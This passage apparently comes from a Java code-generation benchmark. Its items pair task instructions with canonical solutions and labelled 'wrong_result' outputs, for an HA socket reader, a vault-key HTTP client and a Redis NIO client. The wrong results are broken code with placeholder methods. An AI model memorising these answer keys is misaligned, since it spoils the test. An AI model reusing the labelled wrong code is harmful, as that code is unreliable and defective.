    "Instruction": "Task Description: Implement a Java class that handles reading data from a SocketChannel using Java NIO (Non-blocking I/O) for high-availability (HA) communication in a distributed messaging system.\n\nClass Description: ReadSocketService is a service thread that continuously reads data from a SocketChannel using a Selector and ByteBuffer. It processes incoming HA protocol messages (handshake and transfer states) and manages connection state. The class integrates with a high-availability service to maintain synchronization between master and slave nodes.\n\nAttributes:\n- READ_MAX_BUFFER_SIZE: [int] - Constant defining the maximum buffer size for reading (1MB)\n- selector: [Selector] - NIO Selector for monitoring the SocketChannel\n- socketChannel: [SocketChannel] - The channel for communication with the remote peer\n- byteBufferRead: [ByteBuffer] - Buffer for storing read data\n- haReader: [AbstractHAReader] - Reader implementation for processing HA protocol messages\n- processPosition: [int] - Current processing position within the read buffer\n- lastReadTimestamp: [long] - Timestamp of last successful read operation\n\nMethods:\n- ReadSocketService([SocketChannel socketChannel]) -> [void] - Constructor that initializes the selector, configures the socket channel, and sets up the HA reader\n- run() -> [void] - Main service loop that performs selector operations, reads data, and handles connection state\n- getServiceName() -> [String] - Returns the service name with broker identifier if in container mode\n- HAServerReader.processReadResult([ByteBuffer byteBufferRead]) -> [boolean] - Processes the read buffer according to HA protocol (handshake and transfer states), returns true if processing succeeds\n\nThe class should handle connection timeouts, buffer management (including compaction), and proper resource cleanup when stopping. It should integrate with a parent HA connection service for state management and notification.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport org.apache.rocketmq.common.ServiceThread;\nimport org.apache.rocketmq.common.utils.NetworkUtil;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.store.ha.io.AbstractHAReader;\nimport org.apache.rocketmq.store.ha.io.HAWriter;\n\nclass ReadSocketService extends ServiceThread {\n    private static final int READ_MAX_BUFFER_SIZE = 1024 * 1024;\n    private final Selector selector;\n    private final SocketChannel socketChannel;\n    private final ByteBuffer byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private final AbstractHAReader haReader;\n    private int processPosition = 0;\n    private volatile long lastReadTimestamp = System.currentTimeMillis();\n\n    public ReadSocketService(final SocketChannel socketChannel) throws IOException {\n        this.selector = NetworkUtil.openSelector();\n        this.socketChannel = socketChannel;\n        this.socketChannel.register(this.selector, SelectionKey.OP_READ);\n        this.setDaemon(true);\n        haReader = new HAServerReader();\n        haReader.registerHook(readSize -> {\n            if (readSize > 0) {\n                ReadSocketService.this.lastReadTimestamp =\n                    haService.getDefaultMessageStore().getSystemClock().now();\n            }\n        });\n    }\n\n    @Override\n    public void run() {\n        LOGGER.info(this.getServiceName() + \" service started\");\n\n        while (!this.isStopped()) {\n            try {\n                this.selector.select(1000);\n                boolean ok = this.haReader.read(this.socketChannel, this.byteBufferRead);\n                if (!ok) {\n                    AutoSwitchHAConnection.LOGGER.error(\"processReadEvent error\");\n                    break;\n                }\n\n                long interval = haService.getDefaultMessageStore().getSystemClock().now() - this.lastReadTimestamp;\n                if (interval > haService.getDefaultMessageStore().getMessageStoreConfig().getHaHousekeepingInterval()) {\n                    LOGGER.warn(\"ha housekeeping, found this connection[\" + clientAddress + \"] expired, \" + interval);\n                    break;\n                }\n            } catch (Exception e) {\n                AutoSwitchHAConnection.LOGGER.error(this.getServiceName() + \" service has exception.\", e);\n                break;\n            }\n        }\n\n        this.makeStop();\n\n        changeCurrentState(HAConnectionState.SHUTDOWN);\n\n        writeSocketService.makeStop();\n\n        haService.removeConnection(AutoSwitchHAConnection.this);\n\n        haService.getConnectionCount().decrementAndGet();\n\n        SelectionKey sk = this.socketChannel.keyFor(this.selector);\n        if (sk != null) {\n            sk.cancel();\n        }\n\n        try {\n            this.selector.close();\n            this.socketChannel.close();\n        } catch (IOException e) {\n            AutoSwitchHAConnection.LOGGER.error(\"\", e);\n        }\n\n        flowMonitor.shutdown(true);\n\n        AutoSwitchHAConnection.LOGGER.info(this.getServiceName() + \" service end\");\n    }\n\n    @Override\n    public String getServiceName() {\n        if (haService.getDefaultMessageStore().getBrokerConfig().isInBrokerContainer()) {\n            return haService.getDefaultMessageStore().getBrokerIdentity().getIdentifier() + ReadSocketService.class.getSimpleName();\n        }\n        return ReadSocketService.class.getSimpleName();\n    }\n\n    class HAServerReader extends AbstractHAReader {\n        @Override\n        protected boolean processReadResult(ByteBuffer byteBufferRead) {\n            while (true) {\n                boolean processSuccess = true;\n                int readSocketPos = byteBufferRead.position();\n                int diff = byteBufferRead.position() - ReadSocketService.this.processPosition;\n                if (diff >= AutoSwitchHAClient.MIN_HEADER_SIZE) {\n                    int readPosition = ReadSocketService.this.processPosition;\n                    HAConnectionState slaveState = HAConnectionState.values()[byteBufferRead.getInt(readPosition)];\n\n                    switch (slaveState) {\n                        case HANDSHAKE:\n                            Long slaveBrokerId = byteBufferRead.getLong(readPosition + AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE - 8);\n                            AutoSwitchHAConnection.this.slaveId = slaveBrokerId;\n                            short syncFromLastFileFlag = byteBufferRead.getShort(readPosition + AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE - 12);\n                            if (syncFromLastFileFlag == 1) {\n                                AutoSwitchHAConnection.this.isSyncFromLastFile = true;\n                            }\n                            short isAsyncLearner = byteBufferRead.getShort(readPosition + AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE - 10);\n                            if (isAsyncLearner == 1) {\n                                AutoSwitchHAConnection.this.isAsyncLearner = true;\n                            }\n\n                            isSlaveSendHandshake = true;\n                            byteBufferRead.position(readSocketPos);\n                            ReadSocketService.this.processPosition += AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE;\n                            LOGGER.info(\"Receive slave handshake, slaveBrokerId:{}, isSyncFromLastFile:{}, isAsyncLearner:{}\",\n                                AutoSwitchHAConnection.this.slaveId, AutoSwitchHAConnection.this.isSyncFromLastFile, AutoSwitchHAConnection.this.isAsyncLearner);\n                            break;\n                        case TRANSFER:\n                            long slaveMaxOffset = byteBufferRead.getLong(readPosition + 4);\n                            ReadSocketService.this.processPosition += AutoSwitchHAClient.TRANSFER_HEADER_SIZE;\n\n                            AutoSwitchHAConnection.this.slaveAckOffset = slaveMaxOffset;\n                            if (slaveRequestOffset < 0) {\n                                slaveRequestOffset = slaveMaxOffset;\n                            }\n                            byteBufferRead.position(readSocketPos);\n                            maybeExpandInSyncStateSet(slaveMaxOffset);\n                            AutoSwitchHAConnection.this.haService.updateConfirmOffsetWhenSlaveAck(AutoSwitchHAConnection.this.slaveId);\n                            AutoSwitchHAConnection.this.haService.notifyTransferSome(AutoSwitchHAConnection.this.slaveAckOffset);\n                            break;\n                        default:\n                            LOGGER.error(\"Current state illegal {}\", currentState);\n                            return false;\n                    }\n\n                    if (!slaveState.equals(currentState)) {\n                        LOGGER.warn(\"Master change state from {} to {}\", currentState, slaveState);\n                        changeCurrentState(slaveState);\n                    }\n                    if (processSuccess) {\n                        continue;\n                    }\n                }\n\n                if (!byteBufferRead.hasRemaining()) {\n                    byteBufferRead.position(ReadSocketService.this.processPosition);\n                    byteBufferRead.compact();\n                    ReadSocketService.this.processPosition = 0;\n                }\n                break;\n            }\n\n            return true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class ReadSocketService extends Thread {\n    private static final int READ_MAX_BUFFER_SIZE = 1024 * 1024;\n    private final Selector selector;\n    private final SocketChannel socketChannel;\n    private final ByteBuffer byteBufferRead;\n    private final AbstractHAReader haReader;\n    private int processPosition;\n    private long lastReadTimestamp;\n\n    public ReadSocketService(SocketChannel socketChannel) {\n        try {\n            this.selector = Selector.open();\n            this.socketChannel = socketChannel;\n            this.socketChannel.configureBlocking(false);\n            this.socketChannel.register(selector, SelectionKey.OP_READ);\n            this.byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n            this.haReader = new AbstractHAReader();\n            this.processPosition = 0;\n            this.lastReadTimestamp = System.currentTimeMillis();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                selector.select();\n                Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n                while (keys.hasNext()) {\n                    SelectionKey key = keys.next();\n                    keys.remove();\n                    if (key.isReadable()) {\n                        int bytesRead = socketChannel.read(byteBufferRead);\n                        if (bytesRead == -1) {\n                            break;\n                        }\n                        boolean processed = haReader.processReadResult(byteBufferRead);\n                        if (processed) {\n                            processPosition += bytesRead;\n                            if (processPosition >= READ_MAX_BUFFER_SIZE) {\n                                byteBufferRead.compact();\n                                processPosition = 0;\n                            }\n                        }\n                        lastReadTimestamp = System.currentTimeMillis();\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public String getServiceName() {\n        return \"ReadSocketService\";\n    }\n\n    public void stop() {\n        try {\n            if (socketChannel != null) socketChannel.close();\n            if (selector != null) selector.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean HAServerReader_processReadResult(ByteBuffer byteBufferRead) {\n        return haReader.processReadResult(byteBufferRead);\n    }\n}"
  },
  {
    "Task_id": 43,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for interacting with a hub API, handling authentication, and processing various API responses to retrieve encryption keys.\n\nClass Description: The HubHttpClient class provides functionality to communicate with a hub API, manage authentication using bearer tokens, and handle different API response scenarios to retrieve encryption keys. It supports both modern and legacy API versions.\n\nAttributes:\n\nhttpClient: [HttpClient] - The HTTP client instance used for making requests\nbearerToken: [String] - The bearer token used for authentication\nhubConfig: [HubConfig] - Configuration containing API URIs\ndeviceId: [String] - Identifier for the device making requests\nvaultId: [String] - Identifier for the vault being accessed\n\nMethods:\n\nconstructor: [HubHttpClient]([ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId]) -> [void] - Initializes the HTTP client with configuration and authentication details\nrequestApiConfig: [requestApiConfig]() -> [CompletableFuture<ReceivedKey>] - Initiates the API configuration request chain\nhandleApiConfigResponse: [handleApiConfigResponse]([HttpResponse<String> response]) -> [CompletableFuture<ReceivedKey>] - Processes the API configuration response\nrequestDeviceData: [requestDeviceData]() -> [CompletableFuture<ReceivedKey>] - Requests device-specific data from the API\nhandleDeviceDataResponse: [handleDeviceDataResponse]([HttpResponse<String> response]) -> [CompletableFuture<ReceivedKey>] - Processes the device data response\nrequestVaultMasterkey: [requestVaultMasterkey]([String encryptedUserKey]) -> [CompletableFuture<ReceivedKey>] - Requests the vault master key\nhandleVaultMasterkeyResponse: [handleVaultMasterkeyResponse]([String encryptedUserKey, HttpResponse<String> response]) -> [ReceivedKey] - Processes the vault master key response\nrequestLegacyAccessToken: [requestLegacyAccessToken]() -> [CompletableFuture<ReceivedKey>] - Requests a legacy access token\nhandleLegacyAccessTokenResponse: [handleLegacyAccessTokenResponse]([HttpResponse<String> response]) -> [ReceivedKey] - Processes the legacy access token response\nretrievalFailed: [retrievalFailed]([Throwable cause]) -> [ReceivedKey] - Handles request failures",
    "Canonical_solution": "import com.fasterxml.jackson.annotation.JsonIgnoreProperties;\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.google.common.base.Preconditions;\nimport com.nimbusds.jose.JWEObject;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.text.ParseException;\nimport java.time.Duration;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\n\npublic class HubHttpClient {\n\n\tprivate static final Logger LOG = LoggerFactory.getLogger(HubHttpClient.class);\n\tprivate static final ObjectMapper JSON = new ObjectMapper().setDefaultLeniency(true);\n\tprivate static final Duration REQ_TIMEOUT = Duration.ofSeconds(10);\n\n\tprivate final HttpClient httpClient;\n\tprivate final String bearerToken;\n\tprivate final HubConfig hubConfig;\n\tprivate final String deviceId;\n\tprivate final String vaultId;\n\n\tpublic HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId) {\n\t\tthis.httpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).executor(executor).build();\n\t\tthis.bearerToken = Objects.requireNonNull(bearerToken);\n\t\tthis.hubConfig = hubConfig;\n\t\tthis.deviceId = deviceId;\n\t\tthis.vaultId = vaultId;\n\t}\n\n\tpublic CompletableFuture<ReceivedKey> requestApiConfig() {\n\t\tvar configUri = hubConfig.URIs.API.resolve(\"config\");\n\t\tvar request = HttpRequest.newBuilder(configUri)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenCompose(this::handleApiConfigResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> handleApiConfigResponse(HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\tPreconditions.checkState(response.statusCode() == 200, \"Unexpected response \" + response.statusCode());\n\t\ttry {\n\t\t\tvar config = JSON.reader().readValue(response.body(), ConfigDto.class);\n\t\t\tif (config.apiLevel >= 1) {\n\t\t\t\treturn requestDeviceData();\n\t\t\t} else {\n\t\t\t\treturn requestLegacyAccessToken();\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\tthrow new UncheckedIOException(e);\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestDeviceData() {\n\t\tvar deviceUri = hubConfig.URIs.API.resolve(\"devices/\" + deviceId);\n\t\tvar request = HttpRequest.newBuilder(deviceUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8))\n\t\t\t\t.thenCompose(this::handleDeviceDataResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> handleDeviceDataResponse(HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\ttry {\n\t\t\tswitch (response.statusCode()) {\n\t\t\t\tcase 200 -> {\n\t\t\t\t\tvar device = JSON.reader().readValue(response.body(), DeviceDto.class);\n\t\t\t\t\treturn requestVaultMasterkey(device.userPrivateKey);\n\t\t\t\t}\n\t\t\t\tdefault -> throw new IllegalStateException(\"Unexpected response \" + response.statusCode());\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\tthrow new UncheckedIOException(e);\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestVaultMasterkey(String encryptedUserKey) {\n\t\tvar vaultKeyUri = hubConfig.URIs.API.resolve(\"vaults/\" + vaultId + \"/access-token\");\n\t\tvar request = HttpRequest.newBuilder(vaultKeyUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenApply(response -> handleVaultMasterkeyResponse(encryptedUserKey, response))\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate ReceivedKey handleVaultMasterkeyResponse(String encryptedUserKey, HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\tif (response.statusCode() == 200) {\n\t\t\ttry {\n\t\t\t\tvar vaultKeyJwe = JWEObject.parse(response.body());\n\t\t\t\tvar userKeyJwe = JWEObject.parse(encryptedUserKey);\n\t\t\t\treturn ReceivedKey.vaultKeyAndUserKey(vaultKeyJwe, userKeyJwe);\n\t\t\t} catch (ParseException e) {\n\t\t\t\tthrow new RuntimeException(e);\n\t\t\t}\n\t\t} else {\n\t\t\tthrow new IllegalStateException(\"Unexpected response \" + response.statusCode());\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestLegacyAccessToken() {\n\t\tvar legacyAccessTokenUri = hubConfig.URIs.API.resolve(\"vaults/\" + vaultId + \"/keys/\" + deviceId);\n\t\tvar request = HttpRequest.newBuilder(legacyAccessTokenUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenApply(this::handleLegacyAccessTokenResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate ReceivedKey handleLegacyAccessTokenResponse(HttpResponse<String> response) {\n\t\ttry {\n\t\t\tif (response.statusCode() == 200) {\n\t\t\t\tvar token = JWEObject.parse(response.body());\n\t\t\t\treturn ReceivedKey.legacyDeviceKey(token);\n\t\t\t} else {\n\t\t\t\tthrow new IOException(\"Unexpected response \" + response.statusCode());\n\t\t\t}\n\t\t} catch (IOException | ParseException e) {\n\t\t\tthrow new UncheckedIOException(e instanceof IOException ? (IOException) e : new IOException(e));\n\t\t}\n\t}\n\n\tprivate ReceivedKey retrievalFailed(Throwable cause) {\n\t\tthrow new RuntimeException(cause);\n\t}\n\n\t@JsonIgnoreProperties(ignoreUnknown = true)\n\tprivate record DeviceDto(@JsonProperty(value = \"userPrivateKey\", required = true) String userPrivateKey) {}\n\n\t@JsonIgnoreProperties(ignoreUnknown = true)\n\tprivate record ConfigDto(@JsonProperty(value = \"apiLevel\") int apiLevel) {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "import java.net.URI;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.TimeUnit;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\n\npublic class HubHttpClient {\n    private final HttpClient httpClient;\n    private final String bearerToken;\n    private final HubConfig hubConfig;\n    private final String deviceId;\n    private final String vaultId;\n\n    public HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId) {\n        this.httpClient = HttpClient.newHttpClient();\n        this.bearerToken = bearerToken;\n        this.hubConfig = hubConfig;\n        this.deviceId = deviceId;\n        this.vaultId = vaultId;\n    }\n\n    public CompletableFuture<ReceivedKey> requestApiConfig() {\n        return httpClient.sendAsync(\n            HttpRequest.newBuilder()\n                .uri(URI.create(hubConfig.getApiConfigUri()))\n                .header(\"Authorization\", \"Bearer \" + bearerToken)\n                .GET()\n                .build(),\n            HttpResponse.BodyHandlers.ofString()\n        ).thenApply(this::handleApiConfigResponse);\n    }\n\n    private CompletableFuture<ReceivedKey> handleApiConfigResponse(HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            return CompletableFuture.supplyAsync(() -> parseResponse(response.body()), executor);\n        } else {\n            return CompletableFuture.failedFuture(new Throwable(\"API config error: \" + response.statusCode()));\n        }\n    }\n\n    public CompletableFuture<ReceivedKey> requestDeviceData() {\n        return httpClient.sendAsync(\n            HttpRequest.newBuilder()\n                .uri(URI.create(hubConfig.getDeviceDataUri()))\n                .header(\"Authorization\", \"Bearer \" + bearerToken)\n                .GET()\n                .build(),\n            HttpResponse.BodyHandlers.ofString()\n        ).thenApply(this::handleDeviceDataResponse);\n    }\n\n    private CompletableFuture<ReceivedKey> handleDeviceDataResponse(HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            return CompletableFuture.supplyAsync(() -> parseResponse(response.body()), executor);\n        } else {\n            return CompletableFuture.failedFuture(new Throwable(\"Device data error: \" + response.statusCode()));\n        }\n    }\n\n    public CompletableFuture<ReceivedKey> requestVaultMasterkey(String encryptedUserKey) {\n        return httpClient.sendAsync(\n            HttpRequest.newBuilder()\n                .uri(URI.create(hubConfig.getVaultMasterkeyUri()))\n                .header(\"Authorization\", \"Bearer \" + bearerToken)\n                .POST(HttpRequest.BodyPublishers.ofString(encryptedUserKey))\n                .build(),\n            HttpResponse.BodyHandlers.ofString()\n        ).thenApply(this::handleVaultMasterkeyResponse);\n    }\n\n    private ReceivedKey handleVaultMasterkeyResponse(String encryptedUserKey, HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            return parseResponse(response.body());\n        } else {\n            return retrievalFailed(new Throwable(\"Vault masterkey error: \" + response.statusCode()));\n        }\n    }\n\n    public CompletableFuture<ReceivedKey> requestLegacyAccessToken() {\n        return httpClient.sendAsync(\n            HttpRequest.newBuilder()\n                .uri(URI.create(hubConfig.getLegacyAccessTokenUri()))\n                .header(\"Authorization\", \"Bearer \" + bearerToken)\n                .GET()\n                .build(),\n            HttpResponse.BodyHandlers.ofString()\n        ).thenApply(this::handleLegacyAccessTokenResponse);\n    }\n\n    private ReceivedKey handleLegacyAccessTokenResponse(HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            return parseResponse(response.body());\n        } else {\n            return retrievalFailed(new Throwable(\"Legacy access token error: \" + response.statusCode()));\n        }\n    }\n\n    private ReceivedKey parseResponse(String responseBody) {\n        // Assume parsing logic here\n        return new ReceivedKey(); // Placeholder\n    }\n\n    private ReceivedKey retrievalFailed(Throwable cause) {\n        // Assume error handling logic here\n        return new ReceivedKey(); // Placeholder\n    }\n}"
  },
  {
    "Task_id": 430,
    "Instruction": "Task Description: Implement a Java class that establishes and manages a non-blocking TCP client connection to a Redis server using Java NIO (New I/O) techniques. The class should handle connection establishment, data writing, reading, and resource cleanup.\n\nClass Description: PassiveRedisIndexer is a TCP client that connects to a Redis server using non-blocking I/O operations. It manages connection state, handles write operations through a queue, and reads server responses while efficiently managing system resources.\n\nAttributes:\n- writeQueue: Queue<ByteBuffer> - A thread-safe queue holding data buffers to be written to the server\n- ref: AtomicReference<SocketHandler> - Atomic reference to the current socket handler instance\n- conMan: NIOConnectionManager - Manages NIO channel registration and event selection\n- config: ConfigReader - Reads configuration data for server connection details\n- namespaces: Map<String,String> - Static map containing XML namespace definitions for configuration parsing\n\nMethods:\n- getAddress() -> InetAddress - Retrieves the Redis server address from configuration\n  - Input: None\n  - Output: InetAddress - The server address to connect to\n\nSocketHandler Inner Class:\n- chan: SocketChannel - The NIO channel for the TCP connection\n- awaitingWriteNotification: boolean - Flag indicating if write operations are pending\n- toWrite: ByteBuffer - Current buffer being written to the channel\n- oblivion: ByteBuffer - Buffer for reading server responses (discarded in this implementation)\n\nSocketHandler Methods:\n- open() -> void - Initializes and opens the socket channel in non-blocking mode\n  - Input: None\n  - Output: None\n- close() -> void - Cleans up resources and closes the connection\n  - Input: None\n  - Output: None\n- getChannel() -> SocketChannel - Returns the socket channel\n  - Input: None\n  - Output: SocketChannel - The managed socket channel\n- registrationEvent(NIOConnectionManager, SelectionKey) -> void - Handles channel registration events\n  - Input: manager (NIOConnectionManager), key (SelectionKey)\n  - Output: None\n- selectionEvent(SelectionKey) -> void - Handles channel I/O events (connect, read, write)\n  - Input: key (SelectionKey)\n  - Output: None\n- read() -> void - Reads data from the channel (into oblivion buffer)\n  - Input: None\n  - Output: None\n- doStateChecks(long) -> void - Performs periodic connection state checks\n  - Input: now (long) - current timestamp\n  - Output: None\n- calcInterestOps() -> int - Calculates current interest operations for the selector\n  - Input: None\n  - Output: int - Bitmask of interest operations (READ, WRITE, CONNECT)",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.SocketChannel;\nimport java.util.Map;\nimport java.util.Optional;\nimport java.util.Queue;\nimport java.util.concurrent.ConcurrentLinkedQueue;\nimport java.util.concurrent.atomic.AtomicReference;\n\nimport lbms.plugins.mldht.utils.NIOConnectionManager;\nimport lbms.plugins.mldht.utils.Selectable;\nimport the8472.utils.ConfigReader;\nimport the8472.utils.XMLUtils;\nimport the8472.utils.concurrent.SerializedTaskExecutor;\n\npublic class PassiveRedisIndexer {\n\n    private Queue<ByteBuffer> writeQueue = new ConcurrentLinkedQueue<>();\n    private AtomicReference<SocketHandler> ref = new AtomicReference<>();\n    private NIOConnectionManager conMan;\n    private ConfigReader config;\n    private static final Map<String,String> namespaces = Map.of(\"xsi\",\"http://www.w3.org/2001/XMLSchema-instance\");\n\n    class SocketHandler implements Selectable {\n        \n        SocketChannel chan;\n        volatile boolean awaitingWriteNotification = true;\n        ByteBuffer toWrite;\n        ByteBuffer oblivion = ByteBuffer.allocateDirect(4*1024);\n        \n        void open() {\n            try {\n                chan = SocketChannel.open();\n                chan.configureBlocking(false);\n                chan.connect(new InetSocketAddress(getAddress(),6379));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            \n            conMan.register(this);\n        }\n        \n        void close() {\n            writeQueue.clear();\n            ref.compareAndSet(this, null);\n            try {\n                chan.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    \n        @Override\n        public SocketChannel getChannel() {\n            return chan;\n        }\n    \n        @Override\n        public void registrationEvent(NIOConnectionManager manager, SelectionKey key) throws IOException {}\n        \n        @Override\n        public void selectionEvent(SelectionKey key) throws IOException {\n            if(key.isValid() && key.isConnectable()) {\n                chan.finishConnect();\n                conMan.interestOpsChanged(this);\n            }\n                \n            if(key.isValid() && key.isReadable())\n                read();\n            if(key.isValid() && key.isWritable()) {\n                awaitingWriteNotification = false;\n                tryWrite.run();\n                conMan.interestOpsChanged(this);\n            }\n        }\n        \n        Runnable tryWrite = SerializedTaskExecutor.onceMore(() -> {\n            while(!awaitingWriteNotification && !writeQueue.isEmpty()) {\n                if(toWrite == null)\n                    toWrite = writeQueue.poll();\n                if(toWrite == null)\n                    continue;\n                \n                int written = 0;\n                try {\n                    written = chan.write(toWrite);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n                \n                if(written < 0) {\n                    awaitingWriteNotification = true;\n                    close();\n                    continue;\n                }\n                \n                if(toWrite.remaining() > 0) {\n                    awaitingWriteNotification = true;\n                    conMan.interestOpsChanged(this);\n                } else {\n                    toWrite = null;\n                }\n            }\n        });\n        \n        void read() throws IOException {\n            while(true) {\n                oblivion.clear();\n                int read = chan.read(oblivion);\n                if(read < 0)\n                    close();\n                if(read <= 0)\n                    break;\n            }\n        }\n    \n        @Override\n        public void doStateChecks(long now) throws IOException {\n            if(!chan.isOpen()) {\n                close();\n                conMan.deRegister(this);\n            }\n        }\n    \n        @Override\n        public int calcInterestOps() {\n            int ops = SelectionKey.OP_READ;\n            \n            if(chan.isConnectionPending())\n                ops |= SelectionKey.OP_CONNECT;\n            \n            if(awaitingWriteNotification)\n                ops |= SelectionKey.OP_WRITE;\n                \n            return ops;\n        }\n    }\n\n    private InetAddress getAddress() {\n        return config.get(XMLUtils.buildXPath(\"//components/component[@xsi:type='mldht:redisIndexerType']/address\",namespaces))\n                   .flatMap(str -> Optional.ofNullable(str))\n                   .map(str -> {\n                       try {\n                           return InetAddress.getByName(str);\n                       } catch (Exception e) {\n                           throw new RuntimeException(e);\n                       }\n                   })\n                   .get();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "import java.net.InetAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.atomic.AtomicReference;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.concurrent.atomic.AtomicLong;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.TimeUnit;\n\npublic class PassiveRedisIndexer {\n    private final BlockingQueue<ByteBuffer> writeQueue = new LinkedBlockingQueue<>();\n    private final AtomicReference<SocketHandler> ref = new AtomicReference<>();\n    private NIOConnectionManager conMan;\n    private ConfigReader config;\n    private Map<String, String> namespaces;\n\n    public InetAddress getAddress() {\n        return config.getAddress();\n    }\n\n    private class SocketHandler {\n        private final SocketChannel chan;\n        private boolean awaitingWriteNotification;\n        private ByteBuffer toWrite;\n        private ByteBuffer oblivion = ByteBuffer.allocate(1024);\n\n        public void open() {\n            try {\n                chan = SocketChannel.open();\n                chan.configureBlocking(false);\n                conMan.register(chan, SelectionKey.OP_CONNECT | SelectionKey.OP_READ);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n\n        public void close() {\n            try {\n                if (chan != null) {\n                    chan.close();\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n\n        public SocketChannel getChannel() {\n            return chan;\n        }\n\n        public void registrationEvent(NIOConnectionManager manager, SelectionKey key) {\n            if (key.isConnectable()) {\n                if (chan.isConnectionPending()) {\n                    try {\n                        chan.finishConnect();\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n            if (key.isReadable()) {\n                read();\n            }\n            if (key.isWritable()) {\n                // Handle write\n            }\n        }\n\n        public void selectionEvent(SelectionKey key) {\n            if (key.isConnectable()) {\n                if 